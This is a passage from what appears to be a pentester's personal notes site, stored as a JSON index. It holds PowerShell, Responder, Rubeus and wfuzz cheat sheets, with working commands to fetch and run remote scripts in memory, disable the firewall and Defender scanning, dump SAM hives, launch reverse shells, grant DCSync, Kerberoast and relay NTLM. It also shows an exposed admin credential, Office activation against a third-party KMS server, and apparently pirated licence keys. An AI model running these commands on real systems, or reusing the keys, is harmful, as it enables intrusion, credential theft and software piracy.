-and $_.SecurityIdentifier -match \"${compromisedUserSID}\" } | select SecurityIdentifier, ActiveDirectoryRights | fl Grant DCSync Add-DomainObjectAcl -TargetIdentity \"${userIdentity}\" -PrincipalIdentity bfarmer -Rights DCSync With userIdentity passed as : DC=dev,DC=oth,DC=io Ressource PowerView snippets : https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993 PowerView documentation : https://powersploit.readthedocs.io/ Attacking trusted domains : http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/ "},"Pentest/Tools/Powershell.html":{"url":"Pentest/Tools/Powershell.html","title":"Powershell","keywords":"","body":"Powershell Table of content Create and admin user Run as domain user Copy a full directory Check hives rights Display wifi passwords Download file Run as another user Use system proxy IEX downloadstring Set environment variable Add exclusion folder to WinDefender Disable firewall Dump SAM Activate RDP List RDP connection on a machine Kill process by name Scheduled task Domain Information Get password policy Get dommain user information Get computer information Get Organization Unit Get group information Get GPO Get Session information Create and admin user Create the user and add it to the Administrator group net user username password /add net localgroup Administrators nom_user /add Run as domain user Run a powershell as a domain user runas /netonly /user:DOMAIN@USER 'powershell.exe –Exec Bypass' /netonly: network connection will be performed using the domain user profile Copy a full directory Copy a full directory and its subdirectory xcopy.exe /s source_absolute_path dest_absolute_path Check hives rights Use Sysinternals binary accesschk.exe to check the hive ACL accesschk.exe /accepteula -qusk \"Users\" HKLM\\SOFTWARE\\.... Display wifi passwords Display a wifi password knowing its SSID netsh wlan show profiles netsh wlan show profile name=\"NETWORK\" key=clear | Select-String 'Key Content' Download file Invoke-WebRequest -Uri ${url} -OutFile ${outFile} Run as another user Run executable as an other user. Usefull to launch reverse shell with another user privilege. $secpasswd = ConvertTo-SecureString ${password} -AsPlainText -Force $mycreds = New-Object System.Management.Automation.PSCredential (${username}, $secpasswd) $computer = \"${hostname}\" [System.Diagnostics.Process]::Start(${reverseShellPath},\"\", $mycreds.Username, $mycreds.Password, $computer) $username = \"BART\\Administrator\" $password = \"3130438f31186fbaf962f407711faddb\" $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr Invoke-Command -ScriptBlock { XXXXXX } -Credential $cred -Computer localhost https://notchxor.github.io/oscp-notes/4-win-privesc/14-runas/ Use system proxy Use the configured system proxy to perform requests (New-Object System.Net.WebClient).Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX downloadstring Download remote powershell script and execute it from memory powershell.exe -exec Bypass -noexit -C \"IEX (New-Object Net.WebClient).DownloadString('${URI}/file.ps1') Set environment variable Set the value of an environment variable. Set-Content -Path Env:${EnvVar} -Value ${NewValue} Add exclusion folder to WinDefender Add a no-scan directory to WinDefender Set-MpPreference -ExclusionPath \"C:\\Temp\" Disable firewall Fully disable the firewall netsh advfirewall set allprofiles state off Dump SAM Save the SAM and the System hive reg save HKLM\\SAM ./SAM.save reg save HKLM\\System ./System.save Activate RDP Enable and authorize RDP connections # Allow RDP connexions Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\' -Name \"fDenyTSConnections\" -Value 0 # Enable network pre-authentication (allows creds c/c) Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\' -Name \"UserAuthentication\" -Value 1 # Allow RDP flux through the firewall Enable-NetFirewallRule -DisplayGroup \"Remote Desktop\" List RDP connection on a machine List the users having an RDP connection on the targeted machine $DSC = (New-Object System.Management.Automation.PSCredential(\"${domain}\\${user}\", (ConvertTo-SecureString \"${password}\" -AsPlainText -Force))) invoke-command {qwinsta} -ComputerName ${ip} -Credential $DSC Kill process by name Kill all process with a specific name taskkill /IM ${processName} /F Scheduled task # Define the task # Change the /sc and /mo to reach you time need schtasks /create /sc hourly /mo 1 /tn \"${taskname}\" /tr \"${command}\" # Force the task execution schtasks /run /tn \"${taskname}\" Domain Information Get password policy Get-DomainPolicyData | select -ExpandProperty SystemAccess Get dommain user information Get-DomainUser -Identity nlamb Get computer information Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName # Enumerate machine where a specific domain user or group is member of a specific group Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName Get Organization Unit Get-DomainOU -Properties Name | sort -Property Name Get group information Get-DomainGroup | where Name -like \"*Admins*\" | select SamAccountName Get-DomainGroupMember -Identity \"Domain Admins\" | select MemberDistinguishedName Get GPO Get-DomainGPO -Properties DisplayName | sort -Property DisplayName Get-DomainGPO -ComputerIdentity ${ComputerName} -Properties DisplayName | sort -Property # GPO modifying local group membership Get-DomainGPOLocalGroup | select GPODisplayName, GroupName Get Session information Get information of the session open on the local (or remote) machine. CName is the source of the connection. Get-NetSession -ComputerName ${computerName} | select CName, UserName "},"Pentest/Tools/Responder.html":{"url":"Pentest/Tools/Responder.html","title":"Responder","keywords":"","body":"Responder Table of content Basic launch Windows Ressources Basic launch Disable SMB and HTTP in Responder.conf sudo python3 Responder.py -I enp0s3 -r -d -w # sudo PYTHONPATH=venv/lib/python3.6/site-packages python3 Responder-3.1.3.0/Responder.py -I ens192 -A On another terminal # ${targets_file} is a list of target where NTLM authentication will be forwarded # by default, it will dump the SAM # -c to execute specific command # -e to execute specific file # --interactive to get an interactive session ntlmrelayx -tf ${targets_file} --smb2support Windows For Windows you must use WinDivert driver to forward SMB traffic on another port. Ressources Practical NTLM relay guide : https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html "},"Pentest/Tools/Rubeus.html":{"url":"Pentest/Tools/Rubeus.html","title":"Rubeus","keywords":"","body":"Rubeus Table of content Kerberoast AS-REP Roasting Unconstrained delegation Get TGT from eKeys Get TGT from certificate Extract machine TGT Get TGS from TGT Using TGT from Constrained Delegation Kerberoast All SPN: Rubeus.exe kerberoast /simple /nowrap For a given SPN: Rubeus.exe kerberoast /user:${SPN} /nowrap AS-REP Roasting Rubeus.exe asreproast /user:svc_oracle /nowrap Unconstrained delegation Monitor and extract TGT Rubeus.exe monitor /targetuser:nlamb /interval:10 Get TGT from eKeys Rubeus.exe asktgt /user:${machineAccount} /aes256:${aesKey} /opsec /nowrap Get TGT from certificate Rubeus.exe asktgt /user:${user} /certificate:${base64PFX} /password:${pfxPassword} /nowrap Extract machine TGT Rubeus.exe triage Get TGS from TGT Using TGT from Constrained Delegation Rubeus.exe s4u /impersonateuser:${userToImpersonate} /msdsspn:${spnToImpersonate} /user:${principalAllowedToPerformDelegation} /ticket:${base64TGT} /nowrap Use the /altservice:${serviceName} to ask for a different service than the one described in the Constrained Delegation "},"Pentest/Tools/Strace.html":{"url":"Pentest/Tools/Strace.html","title":"Strace","keywords":"","body":"Strace Table of content Filter on syscall Follow child process Display whole arguments Filter on syscall strace -e ${syscallList} # strace -e open,close, execve Follow child process strace -f Display whole arguments strace -v -s ${strsize} "},"Pentest/Tools/Wfuzz.html":{"url":"Pentest/Tools/Wfuzz.html","title":"Wfuzz","keywords":"","body":"Wfuzz Cheatsheet Table of content Proxy Filter result Wordlist Header Cookie DNS Enumeration Connection delay Fuzz different extensions Proxy -p : wfuzz -p 127.0.0.1:8080:HTTP Filter result --hc : hide if status code equal given value --hw : hide if #word equal a given value --hl : hide if #line equal a given value Wordlist -w : use the specified wordlist Header -H \"myheader: myvalue\" : use the specified header (can be chained) Cookie -b cookie1=value1 : use the specified cookie (can be chained) DNS Enumeration -H \"Host: FUZZ.domain.com\" ${ip} Connection delay -t ${thread} : number of simultaneous connections -s ${delay} : time delay to wait between two connections Fuzz different extensions wfuzz -w ${wordlist} -z list,txt-php --hc 404 https://10.10.10.60/FUZZ.FUZ2Z "},"Serveur/KMS/KMS.html":{"url":"Serveur/KMS/KMS.html","title":"KMS Activation","keywords":"","body":"Windows and Office KMS activation Table of content KMS Activate Office Licence not installed KMS Use the python KMS emulator Activate Office cscript \"C:\\Program Files\\Microsoft Office\\Office16\\ospp.vbs\" /inpkey:XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99 cscript \"C:\\Program Files\\Microsoft Office\\Office16\\ospp.vbs\" /unpkey:BTDRB >nul cscript \"C:\\Program Files\\Microsoft Office\\Office16\\ospp.vbs\" /unpkey:KHGM9 >nul cscript \"C:\\Program Files\\Microsoft Office\\Office16\\ospp.vbs\" /unpkey:CPQVG >nul cscript \"C:\\Program Files\\Microsoft Office\\Office16\\ospp.vbs\" /sethst:51.15.11.152 cscript \"C:\\Program Files\\Microsoft Office\\Office16\\ospp.vbs\" /setprt:1688 cscript \"C:\\Program Files\\Microsoft Office\\Office16\\ospp.vbs\" /act Licence not installed (if exist \"%ProgramFiles%\\Microsoft Office\\Office16\\ospp.vbs\" cd /d \"%ProgramFiles%\\Microsoft Office\\Office16\")&(if exist \"%ProgramFiles(x86)%\\Microsoft Office\\Office16\\ospp.vbs\" cd /d \"%ProgramFiles(x86)%\\Microsoft Office\\Office16\")&(for /f %x in ('dir /b ..\\root\\Licenses16\\proplusvl_kms*.xrm-ms') do cscript ospp.vbs /inslic:\"..\\root\\Licenses16\\%x\" >nul)&(for /f %x in ('dir /b ..\\root\\Licenses16\\proplusvl_mak*.xrm-ms') do cscript ospp.vbs /inslic:\"..\\root\\Licenses16\\%x\" >nul) "},"Serveur/LicenceKey.html":{"url":"Serveur/LicenceKey.html","title":"Licence Key","keywords":"","body":"Licence Key Visual Studio 2020 Proxifier Visual Studio 2020 Professional : TD244-P4NB7-YQ6XK-Y8MMM-YWV2J Entreprise : VHF9H-NXBBB-638P6-6JHCY-88JWH Proxifier V4 : KFZUS-F3JGV-T95Y7-BXGAS-5NHHP "}}